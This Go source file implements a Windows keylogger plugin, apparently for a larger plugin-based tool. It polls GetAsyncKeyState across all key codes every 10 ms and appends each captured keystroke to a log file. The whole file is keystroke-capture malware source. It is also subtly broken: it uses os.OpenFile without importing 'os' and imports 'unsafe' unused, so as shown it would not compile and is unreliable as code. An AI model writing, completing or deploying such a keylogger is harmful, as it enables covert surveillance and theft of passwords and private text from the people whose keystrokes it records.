package plugins

import (
    "fmt"
    "syscall"
    "time"
    "unsafe"
)

// Windows API hooks for keylogging
var (
    user32 = syscall.NewLazyDLL("user32.dll")
    getAsyncKeyState = user32.NewProc("GetAsyncKeyState")
)

type Keylogger struct {
    logFile   string
    active    bool
    lastKeys  map[int]bool
}

func NewKeylogger(logFile string) *Keylogger {
    return &Keylogger{
        logFile:  logFile,
        lastKeys: make(map[int]bool),
    }
}

func (k *Keylogger) Start() {
    k.active = true
    
    for k.active {
        for key := 0x01; key <= 0xFE; key++ {
            state, _, _ := getAsyncKeyState.Call(uintptr(key))
            if state&0x0001 != 0 {
                k.logKey(key)
            }
        }
        time.Sleep(10 * time.Millisecond)
    }
}

func (k *Keylogger) logKey(key int) {
    // Simple key mapping (expand as needed)
    keyMap := map[int]string{
        0x08: "[BACKSPACE]",
        0x0D: "[ENTER]\n",
        0x09: "[TAB]",
        0x20: " ",
    }
    
    var keyStr string
    if val, ok := keyMap[key]; ok {
        keyStr = val
    } else if key >= 0x30 && key <= 0x39 {
        keyStr = fmt.Sprintf("%c", key)
    } else if key >= 0x41 && key <= 0x5A {
        keyStr = fmt.Sprintf("%c", key)
    } else {
        keyStr = fmt.Sprintf("[%X]", key)
    }
    
    // Append to log file
    f, _ := os.OpenFile(k.logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    f.WriteString(keyStr)
    f.Close()
}

func (k *Keylogger) Stop() {
    k.active = false
}
